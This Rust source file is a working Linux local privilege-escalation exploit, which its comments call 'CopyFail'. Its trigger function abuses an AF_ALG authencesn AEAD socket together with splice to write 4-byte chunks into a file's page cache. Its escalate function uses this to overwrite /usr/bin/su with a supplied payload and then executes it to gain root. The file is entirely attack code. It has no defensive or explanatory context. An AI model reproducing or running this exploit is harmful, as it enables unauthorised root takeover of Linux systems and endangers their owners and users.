use std::fs::File;
use std::io;
use std::os::unix::io::AsRawFd;

#[repr(C)]
struct SockAddrAlg {
    salg_family: libc::sa_family_t,
    salg_type: [u8; 14],
    salg_feat: u32,
    salg_mask: u32,
    salg_name: [u8; 64],
}

const SOL_ALG: libc::c_int = 279;
const ALG_SET_KEY: libc::c_int = 1;
const ALG_SET_IV: libc::c_int = 2;
const ALG_SET_OP: libc::c_int = 3;
const ALG_SET_AEAD_ASSOCLEN: libc::c_int = 4;
const ALG_SET_AEAD_AUTHSIZE: libc::c_int = 5;

fn cmsg_align(len: usize) -> usize {
    let align = std::mem::size_of::<usize>();
    (len + align - 1) & !(align - 1)
}

fn cmsg_space(data_len: usize) -> usize {
    cmsg_align(std::mem::size_of::<libc::cmsghdr>()) + cmsg_align(data_len)
}

fn cmsg_len(data_len: usize) -> usize {
    cmsg_align(std::mem::size_of::<libc::cmsghdr>()) + data_len
}

unsafe fn write_cmsg(
    buf: &mut [u8],
    offset: &mut usize,
    level: libc::c_int,
    typ: libc::c_int,
    data: &[u8],
) {
    let hdr_ptr = buf.as_mut_ptr().add(*offset) as *mut libc::cmsghdr;
    (*hdr_ptr).cmsg_len = cmsg_len(data.len()) as _;
    (*hdr_ptr).cmsg_level = level;
    (*hdr_ptr).cmsg_type = typ;
    let data_ptr = hdr_ptr.add(1) as *mut u8;
    std::ptr::copy_nonoverlapping(data.as_ptr(), data_ptr, data.len());
    *offset += cmsg_space(data.len());
}

/// Write 4 bytes into the page cache of `fd` at `offset` via CopyFail.
fn trigger(fd: libc::c_int, offset: usize, chunk: &[u8]) -> io::Result<()> {
    unsafe {
        let sock_fd = libc::socket(libc::AF_ALG, libc::SOCK_SEQPACKET, 0);
        if sock_fd < 0 {
            return Err(io::Error::last_os_error());
        }

        let mut addr = SockAddrAlg {
            salg_family: libc::AF_ALG as u16,
            salg_type: [0; 14],
            salg_feat: 0,
            salg_mask: 0,
            salg_name: [0; 64],
        };
        let kind = b"aead";
        addr.salg_type[..kind.len()].copy_from_slice(kind);
        let name = b"authencesn(hmac(sha256),cbc(aes))\0";
        let name_len = name.len().min(64);
        addr.salg_name[..name_len].copy_from_slice(&name[..name_len]);

        let ret = libc::bind(
            sock_fd,
            &addr as *const SockAddrAlg as *const libc::sockaddr,
            std::mem::size_of::<SockAddrAlg>() as libc::socklen_t,
        );
        if ret < 0 {
            let err = io::Error::last_os_error();
            libc::close(sock_fd);
            return Err(err);
        }

        let mut key = vec![0u8; 40];
        key[0] = 0x08;
        key[2] = 0x01;
        key[7] = 0x10;

        let ret = libc::setsockopt(
            sock_fd,
            SOL_ALG,
            ALG_SET_KEY,
            key.as_ptr() as *const libc::c_void,
            key.len() as libc::socklen_t,
        );
        if ret < 0 {
            let err = io::Error::last_os_error();
            libc::close(sock_fd);
            return Err(err);
        }

        let authsize: u32 = 4;
        let ret = libc::setsockopt(
            sock_fd,
            SOL_ALG,
            ALG_SET_AEAD_AUTHSIZE,
            &authsize as *const u32 as *const libc::c_void,
            std::mem::size_of::<u32>() as libc::socklen_t,
        );
        if ret < 0 {
            let err = io::Error::last_os_error();
            libc::close(sock_fd);
            return Err(err);
        }

        let conn_fd = libc::accept(sock_fd, std::ptr::null_mut(), std::ptr::null_mut());
        if conn_fd < 0 {
            let err = io::Error::last_os_error();
            libc::close(sock_fd);
            return Err(err);
        }

        let mut send_data = Vec::with_capacity(4 + chunk.len());
        send_data.extend_from_slice(b"AAAA");
        send_data.extend_from_slice(chunk);

        let aead_assocs: [u8; 4] = [0u8; 4];
        let mut assoc_data = vec![0u8; 20];
        assoc_data[0] = 0x10;
        let auth_len_data: [u8; 4] = [0x08, 0x00, 0x00, 0x00];

        let mut cmsg_buffer = vec![
            0u8;
            cmsg_space(aead_assocs.len())
                + cmsg_space(assoc_data.len())
                + cmsg_space(auth_len_data.len())
        ];
        let mut position = 0;
        write_cmsg(&mut cmsg_buffer, &mut position, SOL_ALG, ALG_SET_OP, &aead_assocs);
        write_cmsg(&mut cmsg_buffer, &mut position, SOL_ALG, ALG_SET_IV, &assoc_data);
        write_cmsg(
            &mut cmsg_buffer,
            &mut position,
            SOL_ALG,
            ALG_SET_AEAD_ASSOCLEN,
            &auth_len_data,
        );

        let iov = libc::iovec {
            iov_base: send_data.as_ptr() as *mut _,
            iov_len: send_data.len(),
        };

        let mut msg: libc::msghdr = std::mem::zeroed();
        msg.msg_iov = &iov as *const libc::iovec as *mut libc::iovec;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buffer.as_mut_ptr() as *mut libc::c_void;
        msg.msg_controllen = cmsg_buffer.len() as _;

        let ret = libc::sendmsg(conn_fd, &msg, libc::MSG_MORE);
        if ret < 0 {
            let err = io::Error::last_os_error();
            libc::close(conn_fd);
            libc::close(sock_fd);
            return Err(err);
        }

        let mut pipe_fds = [0i32; 2];
        if libc::pipe(pipe_fds.as_mut_ptr()) < 0 {
            let err = io::Error::last_os_error();
            libc::close(conn_fd);
            libc::close(sock_fd);
            return Err(err);
        }

        let total_len = offset + 4;
        let mut offset_src: libc::loff_t = 0;
        if libc::splice(
            fd,
            &mut offset_src,
            pipe_fds[1],
            std::ptr::null_mut(),
            total_len,
            0,
        ) < 0
        {
            let err = io::Error::last_os_error();
            libc::close(pipe_fds[0]);
            libc::close(pipe_fds[1]);
            libc::close(conn_fd);
            libc::close(sock_fd);
            return Err(err);
        }

        if libc::splice(
            pipe_fds[0],
            std::ptr::null_mut(),
            conn_fd,
            std::ptr::null_mut(),
            total_len,
            0,
        ) < 0
        {
            let err = io::Error::last_os_error();
            libc::close(pipe_fds[0]);
            libc::close(pipe_fds[1]);
            libc::close(conn_fd);
            libc::close(sock_fd);
            return Err(err);
        }

        let mut recv_buf = vec![0u8; 8 + offset];
        libc::recv(
            conn_fd,
            recv_buf.as_mut_ptr() as *mut libc::c_void,
            recv_buf.len(),
            0,
        );

        libc::close(pipe_fds[0]);
        libc::close(pipe_fds[1]);
        libc::close(conn_fd);
        libc::close(sock_fd);
    }
    Ok(())
}

/// Corrupt /usr/bin/su page cache with the given payload, then execute it.
pub fn escalate(payload: &[u8]) -> io::Result<()> {
    let target = "/usr/bin/su";
    let file = File::open(target)?;
    let fd = file.as_raw_fd();

    for (i, chunk) in payload.chunks(4).enumerate() {
        let offset = i * 4;
        if let Err(e) = trigger(fd, offset, chunk) {
            return Err(e);
        }
    }

    drop(file);

    unsafe {
        libc::execl(
            b"/usr/bin/su\0".as_ptr() as *const libc::c_char,
            b"/usr/bin/su\0".as_ptr() as *const libc::c_char,
            std::ptr::null::<libc::c_char>(),
        );
    }

    Err(io::Error::last_os_error())
}
